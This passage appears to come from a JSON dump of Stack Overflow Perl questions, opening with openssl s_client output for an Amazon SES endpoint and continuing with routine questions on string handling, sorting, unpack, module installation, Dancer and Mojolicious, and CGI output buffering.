CERTIFICATE-----\nMIIFRDCCBCygAwIBAgIQGcGV1HNHcHHJGun1oi7qbTANBgkqhkiG9w0BAQUFADCB\ntTELMAkGA1UEBhMCVVMxFzAVBgNVBAoTDlZlcmlTaWduLCBJbmMuMR8wHQYDVQQL\nExZWZXJpU2lnbiBUcnVzdCBOZXR3b3JrMTswOQYDVQQLEzJUZXJtcyBvZiB1c2Ug\nYXQgaHR0cHM6Ly93d3cudmVyaXNpZ24uY29tL3JwYSAoYykwOTEvMC0GA1UEAxMm\nVmVyaVNpZ24gQ2xhc3MgMyBTZWN1cmUgU2VydmVyIENBIC0gRzIwHhcNMTAxMDA4\nMDAwMDAwWhcNMTMxMDA3MjM1OTU5WjB2MQswCQYDVQQGEwJVUzETMBEGA1UECBMK\nV2FzaGluZ3RvbjEQMA4GA1UEBxQHU2VhdHRsZTEYMBYGA1UEChQPQW1hem9uLmNv\nbSBJbmMuMSYwJAYDVQQDFB1lbWFpbC51cy1lYXN0LTEuYW1hem9uYXdzLmNvbTCB\nnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAuDbIrCnMbnltwoXJfQrV6UgtYTza\nVdjQw+ylHg9pmNRUAeI8kIEkJYK6wIUy8MdJL/NAJdw5H9WFouNyDKi6T2FFGOns\nJU0Qf3Cbsf3XymLxPsMPZ0xgqFYS5QfpuXSwjegkaerABHCOdp0bGnYbpXGFfRzv\nVYO3ej48ku4XAH0CAwEAAaOCAhAwggIMMD0GA1UdEQQ2MDSCHWVtYWlsLnVzLWVh\nc3QtMS5hbWF6b25hd3MuY29tghNlbWFpbC5hbWF6b25hd3MuY29tMAkGA1UdEwQC\nMAAwCwYDVR0PBAQDAgWgMEUGA1UdHwQ+MDwwOqA4oDaGNGh0dHA6Ly9TVlJTZWN1\ncmUtRzItY3JsLnZlcmlzaWduLmNvbS9TVlJTZWN1cmVHMi5jcmwwRAYDVR0gBD0w\nOzA5BgtghkgBhvhFAQcXAzAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy52ZXJp\nc2lnbi5jb20vcnBhMB0GA1UdJQQWMBQGCCsGAQUFBwMBBggrBgEFBQcDAjAfBgNV\nHSMEGDAWgBSl7wsRzsBBA6NKZZBIshzgVy19RzB2BggrBgEFBQcBAQRqMGgwJAYI\nKwYBBQUHMAGGGGh0dHA6Ly9vY3NwLnZlcmlzaWduLmNvbTBABggrBgEFBQcwAoY0\naHR0cDovL1NWUlNlY3VyZS1HMi1haWEudmVyaXNpZ24uY29tL1NWUlNlY3VyZUcy\nLmNlcjBuBggrBgEFBQcBDARiMGChXqBcMFowWDBWFglpbWFnZS9naWYwITAfMAcG\nBSsOAwIaBBRLa7kolgYMu9BSOJsprEsHiyEFGDAmFiRodHRwOi8vbG9nby52ZXJp\nc2lnbi5jb20vdnNsb2dvMS5naWYwDQYJKoZIhvcNAQEFBQADggEBAF/FIwfH4c0X\niIPmF6yKfyiAWp+YuxSteMQzlPluZdxRVdXmukJMABKMbKLyroTV8g9G28aMFIIR\nYLdCZUHci0mlbeTXmfjpMVIvhWlxYFsE+ZHpC3i77fQMtalv8bmlThjMy9aVMB8x\nfUzMSvxRJbSdHIATqHx7CI8ogT5xEYrflbPk0J4ba380Vw3VArmNUKv9pYtgStv8\nYikXMK5ufw0sSBFSo2GAumkvH/DJi8d3AnronpD5WWLs24N6uZCvWqWtKK/FiUhV\nJUMXrDohrbX+88P5fbVymeOShUiE1bU6sGPbhiHzXH7VvSYHmeaTGUNtjG1aV/py\nwHMrnJ7V7Xs=\n-----END CERTIFICATE-----\nsubject=/C=US/ST=Washington/L=Seattle/O=Amazon.com Inc./CN=email.us-east-1.amazonaws.com\nissuer=/C=US/O=VeriSign, Inc./OU=VeriSign Trust Network/OU=Terms of use at https://www.verisign.com/rpa (c)09/CN=VeriSign Class 3 Secure Server CA - G2\n---\nNo client certificate CA names sent\n---\nSSL handshake has read 3075 bytes and written 300 bytes\n---\nNew, TLSv1/SSLv3, Cipher is RC4-MD5\nServer public key is 1024 bit\nCompression: NONE\nExpansion: NONE\nSSL-Session:\n    Protocol  : TLSv1\n    Cipher    : RC4-MD5\n    Session-ID: EA1C64EA86BFBE11BE8395F15DBF6B21228719EB215857257CD71AB2EFC3AE9E\n    Session-ID-ctx: \n    Master-Key: 9BFE26D5AFD9C1D222DF73A607CD491F617CD87BC7DCD15904954F198692E22ACACBFAA03A6F10B9F87073DA162B4EB3\n    Key-Arg   : None\n    Start Time: 1302693748\n    Timeout   : 300 (sec)\n    Verify return code: 20 (unable to get local issuer certificate)\n---\nDONE\n</code></pre>\n\n<p>This is the same response as on the instance where ses-get-stats.pl works.</p>\n\n<p>After creating a certificate file as suggested by daxim, running:</p>\n\n<pre><code>openssl s_client -CAfile test.cer -connect email.us-east-1.amazonaws.com:443 &lt; /dev/null\n</code></pre>\n\n<p>Returns:</p>\n\n<pre><code>    CONNECTED(00000003)\ndepth=2 /C=US/O=VeriSign, Inc./OU=Class 3 Public Primary Certification Authority - G2/OU=(c) 1998 VeriSign, Inc. - For authorized use only/OU=VeriSign Trust Network\nverify return:1\ndepth=1 /C=US/O=VeriSign, Inc./OU=VeriSign Trust Network/OU=Terms of use at https://www.verisign.com/rpa (c)09/CN=VeriSign Class 3 Secure Server CA - G2\nverify return:1\ndepth=0 /C=US/ST=Washington/L=Seattle/O=Amazon.com Inc./CN=email.us-east-1.amazonaws.com\nverify return:1\n---\nCertificate chain\n 0 s:/C=US/ST=Washington/L=Seattle/O=Amazon.com Inc./CN=email.us-east-1.amazonaws.com\n   i:/C=US/O=VeriSign, Inc./OU=VeriSign Trust Network/OU=Terms of use at https://www.verisign.com/rpa (c)09/CN=VeriSign Class 3 Secure Server CA - G2\n 1 s:/C=US/O=VeriSign, Inc./OU=VeriSign Trust Network/OU=Terms of use at https://www.verisign.com/rpa (c)09/CN=VeriSign Class 3 Secure Server CA - G2\n   i:/C=US/O=VeriSign, Inc./OU=Class 3 Public Primary Certification Authority - G2/OU=(c) 1998 VeriSign, Inc. - For authorized use only/OU=VeriSign Trust Network\n</code></pre>\n\n<p>followed by additional information including the certificate.</p>\n"},{"tags":["perl","string"],"answer_count":4,"favorite_count":2,"up_vote_count":11,"down_vote_count":0,"view_count":12642,"score":11,"question_id":736616,"title":"How can I get a character at a given index in Perl?","body":"<p>If I have a Perl string:</p>\n\n<pre><code>$str = \"Hello\";\n</code></pre>\n\n<p>how can I get a character at a given index similar to charAt(index)?</p>\n"},{"tags":["perl","search","replace","repetition"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12964773,"title":"perl string to array with repetition operator","body":"<p>I have a string, say: \"5 3*3 4*1 6*3 14*4 3*2 2*3 4\"</p>\n\n<p>I want this string to become an array with elements:</p>\n\n<p>@array = ( \"5\", \"3\" x 3, \"1\" x 4, \"3\" x 6, \"4\" x 14, \"2\" x 3, \"3\" x 2, \"4\" );</p>\n\n<p>I'm guessing there's a better (shorter) way than this:</p>\n\n<pre><code>$string = \"5 3*3 4*1 6*3 14*4 3*2 2*3 4\";\n@array = split (/\\s+/,$string);\nforeach(@array) {\n   if ( /\\*/ ) {\n      s/^(\\d+)\\*(\\d+)/\"$2\" x $1/g;\n   } else {\n      print \"$_\\n\";\n      $_ = '\"'. $_ .'\"';\n   }\n}\n</code></pre>\n\n<p>EDIT: This code actually does what I say it should do above in the original question. But it's not actually what I want. I want the final array to look like:</p>\n\n<p>@array = (5, 3, 3, 3, ...)</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12964193,"title":"Perl Open In Unix root directory","body":"<p>Is it impossible to open a file for writing in the Unix root directory (\"/\") with Perl open?</p>\n"},{"tags":["perl","video","metadata"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12964393,"title":"are there any tools/scripts for analyzing/retrieving flash/html5 video information/metadata","body":"<p>I want to play youtube video with a certain resolution, like 360p\nand capture the packets, and then extract the video from the packets\nand then I want to analyzing/retrieving flash/html5 video information/metadata from these videos\nBTW, are videos still with the same resolution when they are extracted from the captured packets?</p>\n\n<p>note that these videos may not be complete</p>\n\n<p>are there any good tools for analyzing/retrieving flash/html5 video information/metadata\nlike video bit rate, video resolution(like 360p, 480p), used audio/video codecs, video size and duration/duration \nif the video is not complete, the information would ideally include the original video size, the actual video size, the original video length/duration and the actual video length/duration</p>\n\n<p>I hope it is a script, if it is a tool. I hope it can be run through shell using command line coz I want automation.</p>\n\n<p>A paper says perl could do this, but I don't how\nthanks!</p>\n"},{"tags":["perl","bash","awk","pair"],"answer_count":7,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":189,"score":4,"question_id":12963783,"title":"Removing repeated pairs from a very big text file","body":"<p>I have a very big text file (few GB) that has the following format:</p>\n\n<pre><code>1 2\n3 4\n3 5\n3 6\n3 7\n3 8\n3 9\n</code></pre>\n\n<p>File is already sorted and double lines  were removed. There are repeated pairs like '2 1', '4 3' reverse  order that I want to remove. Does anybody have any solution to do it in a very resource limited environments, in BASH, AWK, perl or any similar languages?  I can not load the whole file and loop between the values.  </p>\n"},{"tags":["perl","exception-handling","dancer"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12963195,"title":"Modify Exception Handling using Hooks in Dancer","body":"<p>I'm trying to set up a hook to catch all exceptions and errors thrown from my Dancer application ( an API ) and pass them to a function that sets the HTTP status code and returns the hash ( serialized as JSON ). </p>\n\n<p>Everything works fine when I use try/catch, but when I move it to a hook it runs the code but the response is formed using the default error mechanism instead of my function.</p>\n\n<p>This is the hook I'm using:</p>\n\n<pre><code># Handle errors\nhook on_handler_exception =&gt; sub {\n    my $e = shift;\n    debug \"ON HANDLER EXCEPTION\";\n    return API::Exception-&gt;handle($e); # sets status code and returns hash depending on the exception\n};\n</code></pre>\n\n<p>I also tried using <code>halt</code> instead of return to stop any further processing of the exception but it didn't alter anything.</p>\n\n<p>How would I accomplish this with Dancer? Thanks.</p>\n"},{"tags":["perl","loops","hashref"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12954409,"title":"Perl loop thru nested blessed hashref elements","body":"<p>I have a perl data structure similar to the following:</p>\n\n<pre><code>$VAR1 = bless( {\n                 'admin' =&gt; '0',\n                 'groups_list' =&gt; [\n                                           bless( {\n                                                    'name' =&gt; undef,\n                                                    'groupid' =&gt; 'canedit',\n                                                    'description' =&gt; 'Can Edit Articles'\n                                                  }, 'group_entry' ),\n                                           bless( {\n                                                    'name' =&gt; undef,\n                                                    'groupid' =&gt; 'webuser',\n                                                    'description' =&gt; 'Can Access Content'\n                                                  }, 'group_entry' ),\n                                         ],\n                 'trusted' =&gt; '1',\n               }, 'user_info' );\n</code></pre>\n\n<p>I am looking for a way to loop thru all the groups in 'groups_list' and check if we have 'webuser' groupid in it. Any help is appreciated.</p>\n\n<p>Also, kindly let me know if this can be done without using a loop.. something like searching for the string <strong>'groupid' => 'webuser'</strong> ..</p>\n"},{"tags":["perl","replace"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12962799,"title":"How can I replace a string containing character ` in bash?","body":"<p>I have a string like this</p>\n\n<pre><code>export KEY_CONFIG=`$EASY_RSA/whichopensslcnf $EASY_RSA`\n</code></pre>\n\n<p>and I would like to replace with this one</p>\n\n<pre><code>export KEY_CONFIG=/etc/openvpn/easy-rsa/2.0/openssl-1.0.0.cnf\n</code></pre>\n\n<p>I'm trying to use perl like this, bu it doesn't work</p>\n\n<pre><code>sudo perl -pi -e 's#\\`$EASY_RSA/whichopensslcnf $EASY_RSA\\`\"#export KEY_CONFIG=/etc/openvpn/easy-rsa/2.0/openssl-1.0.0.cnf#g' fileDirectory\n</code></pre>\n\n<p>Any hints?</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["perl","sorting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12961663,"title":"perl quick sort","body":"<p>Is there a way to do very quick sort in perl? Like I have a very large hash, probably with 100 million keys there. It is very inefficient to do <code>foreach my $x (sort {$a cmp $b} keys %myhash){DO SOMETHING}</code> when I test. Wondering if I can first copy out all keys to a array and use a quick sort to it. </p>\n"},{"tags":["perl","parameter-passing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":12962461,"title":"Named Parameters in Perl","body":"<p>I'm attempting to use Named Parameters in perl\nI've been using this as a reference:\n<a href=\"http://perldesignpatterns.com/?NamedArguments\" rel=\"nofollow\">http://perldesignpatterns.com/?NamedArguments</a></p>\n\n<p>it seems to make sense however I can't seem to actually get the values sent in.</p>\n\n<p>I have tried changing to $args{'name'}, $args{\"name\"} as well and no luck.</p>\n\n<p>I just can't seem to get the values passed in. Can someone point me in the direction I need to look to figure out what on earth is happening?</p>\n\n<p>doh.pm</p>\n\n<pre><code>package doh;\nsub new ()\n{\n   my %args = @_;\n   $name = $args{name};\n   print $name;\n}\n1;\n__END__\n</code></pre>\n\n<p>test.pl</p>\n\n<pre><code>use warnings;\nuse doh;\n$trial = doh::;\n$trial-&gt;new(name =&gt; \"Tyson\");\n</code></pre>\n\n<p>No output is printed when test.pl is ran.</p>\n"},{"tags":["perl","cpan"],"answer_count":16,"favorite_count":14,"up_vote_count":25,"down_vote_count":0,"view_count":19587,"score":25,"question_id":115425,"title":"How do I get a list of installed CPAN modules?","body":"<p>Aside from trying</p>\n\n<pre><code>perldoc &lt;module name&gt;\n</code></pre>\n\n<p>individually for any CPAN module that takes my fancy or going through the file system and looking at the directories I have no idea what modules we have installed. </p>\n\n<p>What's the easiest way to just get a big list of every CPAN module installed? From the command line or otherwise.</p>\n"},{"tags":["perl","excel","ole","workbook"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12961662,"title":"How do I use Perl to run a macro in an **already open** Excel workbook","body":"<p>I would like to use Perl to run a macro in an <strong>already open</strong> Excel workbook.  </p>\n\n<p>The following code works if I just want to open a workbook and run a macro:</p>\n\n<pre><code>#!C:\\Perl\\bin\\perl.exe    \nuse strict;\nuse Win32::OLE;\n\nmy $Excel = Win32::OLE-&gt;new('Excel.Application') or die;\n$Excel-&gt;Workbooks-&gt;open('M:\\Programs\\MyExcelFile.xls');\n$Excel-&gt;run('Book1!ChartData');\n$Excel-&gt;quit;\n</code></pre>\n\n<p>But how do I operate on an <strong>open</strong> workbook?</p>\n"},{"tags":["perl","loops","bytearray"],"answer_count":5,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":1727,"score":3,"question_id":1140414,"title":"How can I access the nth byte of a binary scalar in Perl?","body":"<p>Thanks to everyone in advance.</p>\n\n<p>I'd like to access the nth byte of a binary scalar. For example you could get all the file data in one scalar variable...</p>\n\n<p>Imagine that the binary data is collected into scalar... </p>\n\n<pre><code>open(SOURCE, \"&lt;\", \"wl.jpg\"); \nmy $thisByteData = undef; \nwhile(&lt;SOURCE&gt;){$thisByteData .= $_;} \nclose SOURCE; \n</code></pre>\n\n<p>$thisByteData is raw binary data. When I use length($thisByteData) I get the byte count back, so Perl does know how big it is. My question is how can I access the Nth byte?</p>\n\n<p>Side note: My function is going to receive this binary scalar, its in my function that I want to access the Nth byte. The help regarding how to collect this data is appreciated but not what I'm looking for. Whichever way the other programmer wants to collect the binary data is up to them, my job is to get the Nth byte when its passed to me :)</p>\n\n<p>Again thanks so much for the help to all!</p>\n\n<hr>\n\n<p>Thanks to @muteW who has gotten me further than ever. I guess I'm not understanding unpack(...) correctly.</p>\n\n<pre><code>print(unpack(\"N1\", $thisByteData));\nprint(unpack(\"x N1\", $thisByteData));\nprint(unpack(\"x0 N1\", $thisByteData));\n</code></pre>\n\n<p>Is returning the following:</p>\n\n<pre><code>4292411360\n3640647680\n4292411360\n</code></pre>\n\n<p>I would assume those 3 lines would all access the same (first) byte. Using no \"x\" just an \"x\" and \"x$pos\" is giving unexpected results.</p>\n\n<p>I also tried this...</p>\n\n<pre><code>print(unpack(\"x0 N1\", $thisByteData));\nprint(unpack(\"x1 N1\", $thisByteData));\nprint(unpack(\"x2 N1\", $thisByteData));\n</code></pre>\n\n<p>Which returns... the same thing as the last test...</p>\n\n<pre><code>4292411360\n3640647680\n4292411360\n</code></pre>\n\n<p>I'm definatly missing something about how unpack works.</p>\n\n<hr>\n\n<p>If I do this...</p>\n\n<pre><code>print(oct(\"0x\". unpack(\"x0 H2\", $thisByteData)));\nprint(oct(\"0x\". unpack(\"x1 H2\", $thisByteData)));\nprint(oct(\"0x\". unpack(\"x2 H2\", $thisByteData)));\n</code></pre>\n\n<p>I get what I was expecting...</p>\n\n<pre><code>255\n216\n255\n</code></pre>\n\n<p>Can't unpack give this to me itself without having to use oct()?</p>\n\n<hr>\n\n<p>As a side note: I think I'm  getting the 2's complement of these byte integers when using \"x$pos N1\". I'm expecting these as the first 3 bytes.</p>\n\n<pre><code>255\n216\n255\n</code></pre>\n\n<p>Thanks again for the help to all.</p>\n\n<hr>\n\n<p>Special thanks to @brian d foy and @muteW ... I now know how to access the Nth byte of my binary scalar using unpack(...). I have a new problem to solve now, which isn't related to this question. Again thanks for all the help guys!</p>\n\n<p>This gave me the desired result...</p>\n\n<pre><code>print(unpack(\"x0 C1\", $thisByteData));\nprint(unpack(\"x1 C1\", $thisByteData));\nprint(unpack(\"x2 C1\", $thisByteData));\n</code></pre>\n\n<p>unpack(...) has a ton of options so I recommend that anyone else who reads this read the pack/unpack documentation to get the byte data result of their choice. I also didn't try using the Tie options @brian mentioned, I wanted to keep the code as simple as possible.</p>\n"},{"tags":["perl","unix"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":76,"score":-1,"question_id":12960121,"title":"stop console output from unix command execution in perl","body":"<p>I am running unix commands in perl as</p>\n\n<pre><code>$cmd=\"ls -l\";\n$result=`$cmd`;\nprint $log_file $result;\n</code></pre>\n\n<p>but the output from execution is also printed on screen.\nhow to execute command without printing result on screen ?</p>\n"},{"tags":["perl","unicode","html-entities","mason"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":98,"score":2,"question_id":12844458,"title":"Perl, Starman Unicode wide character in syswrite at","body":"<p>I have this word  <strong>comÐ¯ade</strong> but I can't print it in HTML because of the Russian Ð¯... I\ntried: </p>\n\n<pre><code>$HTML::Entities::char2entity{'Ð¯'} = '&amp;#1071;';  \n$HTML::Entities::char2entity{'1071'} = '&amp;#1071;';  \n$HTML::Entities::char2entity{'ÃÃÂ¯'} = '&amp;#1071;';  \n$str = HTML::Entities::encode_entities( $str, q{Ð¯ÃÃÂ¯1071} );   \n</code></pre>\n\n<p>and after that I tried:  </p>\n\n<pre><code>$str =~ s/1071/&amp;#1071;/g;\n$str =~ s/Ð¯/&amp;#1071;/g;\n$str =~ s/ÃÃÂ¯/&amp;#1071;/g;    \n</code></pre>\n\n<p>But in both cases I get this error:</p>\n\n<p><strong>Wide character in syswrite at /usr/local/share/perl/5.10.1/Starman/Server.pm line 470.</strong>  </p>\n\n<p>Why?  </p>\n\n<p>Some code:  </p>\n\n<p><strong>title.mi</strong>   </p>\n\n<pre><code>&lt;%init&gt;\nbinmode STDOUT, ':encoding(UTF-8)';\n($str =~ s/&amp;/%26/g;); #this is working\n$str =~ s/1071/&amp;#1071;/g;\n$str =~ s/Ð¯/&amp;#1071;/g;\n$str =~ s/ÃÃÂ¯/&amp;#1071;/g;\n&lt;/%init&gt;\n&lt;div class=\"bd-headline left\"&gt;\n&lt;h1 style=\"margin-top:0; padding-top:0;\"&gt; &lt;% $str %&gt; &lt;/h1&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p><strong>base.mc</strong>  </p>\n\n<pre><code>&lt;head&gt;\n     &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt;\n&lt;/head&gt;\n</code></pre>\n"},{"tags":["perl","integer","concatenation"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":88,"score":-1,"question_id":12959534,"title":"Perl concatenate two numbers into another one?","body":"<p>I don't want to add the numbers, but \"concatenate\" them and interpret the value as a single number. For example,</p>\n\n<pre><code>$var1 = 567;\n$var2 = 1111;\n\n#trying to explain what I wanna do with java-style syntax\n$var3 = parseInt($var1 CONCAT $var2); \n\nprint $var3; #5671111 and is of type integer\n</code></pre>\n\n<p>How can I go about this? Thanks</p>\n"},{"tags":["perl","reference"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12958962,"title":"Assign address of one array to another in Perl possible?","body":"<p>In the following C# code:</p>\n\n<pre><code>int[] X = new int[2];\nX[0] = 1;\nX[1] = 2;\nint[] Y = X;\nX[1] = 3;\n</code></pre>\n\n<p>After this executes, Y[1] will also be 3 since the operation Y = X does not do a clone but rather assigns the reference or pointer of what X is pointing at to Y.</p>\n\n<p>If the same operation is tried under Perl 5:</p>\n\n<pre><code>my @X = (1, 2);\nmy @Y = @X;\n$X[1] = 3;\n</code></pre>\n\n<p>Unlike C#, Y[1] is not 3, but still 2, which indicates that Perl makes a copy of the array after the @Y = @X operation.</p>\n\n<p>So, my question is - is there any way to assign or initialize a Perl 5 array with the reference of another Perl array so that they both point to the same data?  I already know about references and have tried dereferencing a reference to an array, but that too makes a copy.  I'm also aware that using a reference to an array will solve most of what I'm trying to do, so I don't need any answers showing how to work with references.</p>\n"},{"tags":["bash","perl","unix","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":162,"score":2,"question_id":12606996,"title":"Webpage to take input from shell script and display result","body":"<p>I am newbie to web programming and I have small shell script which basically gives output with two results. It's basically to find users on our directory.</p>\n\n<pre><code>#!/bin/bash\necho -n \"Please enter username to lookup: \"\nread USERNAME\nDISPLAYNAME=`ldapsearch -p xxx -LLL -x -w test -h abc.com -D abc -b dc=abc,dc=com sAMAccountName=$USERNAME | grep displayName`\n\nif [ -z \"$DISPLAYNAME\" ]; then\n  echo \"No entry found for $USERNAME\"\nelse \n  echo \"Entry found for $USERNAME\"\nfi\n</code></pre>\n\n<p>Looking out for perl web code which can display the results on browser.</p>\n\n<p>I know, I would be asking too much here, but I would really appreciate if anyone can give me right direction to achieve this.</p>\n\n<p>Thanks!</p>\n"},{"tags":["perl","date","manipulation"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":85,"score":0,"question_id":12956755,"title":"perl date manipulation","body":"<p>I have a task in perl in which I need to execute 'some_code' but only if date is older than 24 hours counting from now. I'm trying the below code but it doesn't seems to be working.</p>\n\n<pre><code>sub function {\n\n  use Date::Manip::Date\n  use Date::Parse\n  use Date::Format;\n\n  my $yesterday = time() - 60*60*24;\n  my $x = shift;\n  my $env = shift;\n\n  $env-&gt;{some_code} = 1 if $x &lt; $yesterday;\n\n return $x;\n} \n</code></pre>\n\n<p>Any help appreciated.</p>\n"},{"tags":["perl","mod-perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":120,"score":0,"question_id":12682783,"title":"Regarding Perl DBD::Oracle installation in local directory","body":"<ol>\n<li><p>I want to connect with the oracle database from a perl script in solaris servier.  Able to see DBI is installed but not DBD::Oracle in the current perl version 5.8.4.  I dont have root acess and working on my home user id.  Download the DBD-Oracle-1.50 and unzipped in the local directory where my perl script exists. I want to copy the DBD Oracle library files into a custom directory and run the script since i dont have root acess.  When i read the install script in the DBD-Oracle-1.50  it's says for manuall install i need to run the below scripts .  Since i dont have root access i want to copy the library modules into the local directory. Not sure how to tell these scripts to install it in the local directory where my perl script exists.      </p></li>\n<li><p>Does installing DBI and DBD in a custom directory under my user id makes it work properly. Do those modules require root access to work properly? To use DBD::Oracle does oracle needs to be installed in server. My Understanding Oracle driver DBD::Oracle should take care of it.</p></li>\n</ol>\n\n<blockquote>\n<pre><code> perl Makefile.PL\n make &amp;&amp; make test\n make install \n\n&gt;  ls -tlr /usr/perl5/vendor_perl/5.8.4/sun4-solaris-64int total 956\n&gt; -rwxr-xr-x   1 root     bin        15161 Mar 26  2005 Roadmap.pod\n&gt; -rwxr-xr-x   1 root     bin         1048 Sep  5  2006 TASKS.pod\n&gt; -rwxr-xr-x   1 root     bin       289343 Jun 26  2007 DBI.pm\n&gt; -rwxr-xr-x   1 root     bin         4608 Jun 12  2008 goferperf.pl\n&gt; -rwxr-xr-x   1 root     bin         1356 Jun 12  2008 dbixs_rev.pl\n&gt; -rwxr-xr-x   1 root     bin        58386 Apr  3  2010 SNMP.pm drwxr-xr-x   3 root     bin            7 Oct 13  2010 NetSNMP\n&gt; drwxr-xr-x   2 root     bin            3 Oct 13  2010 Win32 drwxr-xr-x\n&gt; 8 root     bin           19 Oct 13  2010 DBI drwxr-xr-x   2 root    \n&gt; bin            4 Oct 13  2010 Bundle drwxr-xr-x   6 root     other    \n&gt; 6 Oct 13  2010 auto drwxr-xr-x   3 root     bin           11 Oct 13 \n&gt; 2010 DBD\n&gt; \n&gt; ls -ltr  /usr/perl5/vendor_perl/5.8.4/sun4-solaris-64int/DBD total 543\n&gt; -rwxr-xr-x   1 root     bin       111586 May  6  2006 Pg.pm\n&gt; -rwxr-xr-x   1 root     bin        28785 Sep 27  2006 Proxy.pm\n&gt; -rwxr-xr-x   1 root     bin         7937 Jan 25  2007 Sponge.pm\n&gt; -rwxr-xr-x   1 root     bin        42836 Feb  6  2007 DBM.pm\n&gt; -rwxr-xr-x   1 root     bin        19882 Mar 28  2007 File.pm\n&gt; -rwxr-xr-x   1 root     bin        12051 May 10  2007 ExampleP.pm\n&gt; -rwxr-xr-x   1 root     bin        43586 May 14  2007 Gofer.pm\n&gt; -rwxr-xr-x   1 root     bin         3761 Jun 15  2007 NullP.pm drwxr-xr-x   4 root     bin            4 Oct 13  2010 Gofer\n</code></pre>\n</blockquote>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":68,"score":2,"question_id":12958603,"title":"Perl's \"not\" operator not working as expected with the defined() function","body":"<p>The following snippet is not working as expected:</p>\n\n<pre><code>$k{\"foo\"}=1;\n$k{\"bar\"}=2; \nif(not defined($k{\"foo\"}) &amp;&amp; not defined($k{\"bar\"})){\n    print \"Not defined\\n\";\n}\nelse{\n    print \"Defined\"\n}\n</code></pre>\n\n<p>Since both $k{\"foo\"} and $k{\"bar\"} are defined, the expected output is \"Defined\". Running the code, however, returns \"Not defined\".</p>\n\n<p>Now, playing around with the code I realized that placing parentheses around each of the <code>not defined()</code> calls produces the desired result:</p>\n\n<pre><code>if((not defined($k{\"foo\"})) &amp;&amp; (not defined($k{\"bar\"}))){print \"Not Defined\"}\n</code></pre>\n\n<p>I imagine this has something to do with operator precedence but could someone explain what exactly is going on? </p>\n"},{"tags":["perl","mojolicious"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":90,"score":4,"question_id":12915052,"title":"Mojolicious Basic Authentication using \"under\" without Mojolicious::Lite","body":"<p>I am looking for a clean and simple example of how to use the \"under\" functionality in a \"Mojolicious\" application. All the examples I find are dealing with \"Mojolicious::Lite\" (which I don't use).\nFor example I listened to the screencast here <a href=\"http://mojocasts.com/e3\" rel=\"nofollow\">http://mojocasts.com/e3</a> and I think I understand the concept of the under functionality. But I don't use \"Mojolicious::Lite\", so it seems that I can't follow the example directly. I keep on failing trying to adopt the Lite-example for non-Lite style. (That's probably also because I'm still kind of new to the framework)</p>\n\n<p>The relevant code looks like this:</p>\n\n<pre><code># Router\nmy $r = $self-&gt;routes;\n\n# Normal route to controller\n$r-&gt;get('/') -&gt;to('x#a');\n$r-&gt;get('/y')-&gt;to('y#b');\n$r-&gt;any('/z')-&gt;to('z#c');\n</code></pre>\n\n<p>So all of this routes need to be protected by user/pass. I tried to do something like this:</p>\n\n<pre><code>$r-&gt;under = sub { return 1 if ($auth) };\n</code></pre>\n\n<p>But this does not compile and I just can't find an example matching this code-style...\nCan anybody give me the right hint or link here?\nAnd please forgive me if this is somewhere in the docs... they might be complete, but they lack understandable examples for simple minded guys like me :-P</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":82,"score":-2,"question_id":12957665,"title":"Why do we use .pl extension","body":"<p>Perl program executes fine without <code>.pl</code> in both Linux and Windows.</p>\n\n<p>Why do we use <code>.pl</code> extension? Is it just used for identifying scripts?</p>\n\n<p>There's one <a href=\"http://stackoverflow.com/questions/3677114/running-a-perl-script-on-windows-without-extension\">question</a> about how <code>.pl</code> extension could be used in windows to execute perl scripts.</p>\n\n<p>Does this work for you?</p>\n"},{"tags":["perl","apache","ubuntu","buffering"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":88,"score":4,"question_id":12919808,"title":"ubuntu apache2 cgi output buffering","body":"<p>I'm having problems with apache2 on unbuntu ( 11.04 and 12.04 ) buffering all cgi output until the script terminates. If I run the same script on Centos/rhel 6.2 apache2, it runs normally.  </p>\n\n<pre><code>#!/usr/bin/perl\n\n$|=1;\nprint \"Content-type: text/html\\r\\n\\r\\n\";\n\nprint \"hi..\";\nsleep 1;\nprint \"hi..\";\nsleep 1;\nprint \"hi..\";\nsleep 1;\n</code></pre>\n\n<p>I have verified that mod_deflate is disabled.</p>\n\n<p>Also, it's NOT just a perl thing, the same cgi script written in bash behaves the same on ubuntu VS centos/rhel. </p>\n\n<p>I'm going crazy here, surely someone has ran 